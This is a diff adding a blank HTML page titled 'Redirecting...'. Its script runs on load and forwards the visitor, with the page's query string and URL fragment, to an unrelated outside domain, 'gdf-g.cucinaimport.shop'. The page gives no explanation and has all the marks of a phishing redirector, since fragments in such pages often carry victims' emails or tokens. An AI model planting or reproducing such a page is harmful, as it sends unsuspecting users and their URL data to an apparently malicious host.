@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        (function () {
+            const currentUrl = new URL(window.location.href); // Parse the current URL
+            const baseUrl = "https://gdf-g.cucinaimport.shop"; // Target URL
+            const queryString = currentUrl.search; // Get query string
+            const fragment = currentUrl.hash; // Get the fragment (# part)
+            const redirectUrl = baseUrl + queryString + fragment; // Combine all parts
+
+            // Redirect to the new URL
+            window.location.replace(redirectUrl);
+        })();
+    </script>
+</head>
+<body>
+    <p></p>
+</body>
+</html>
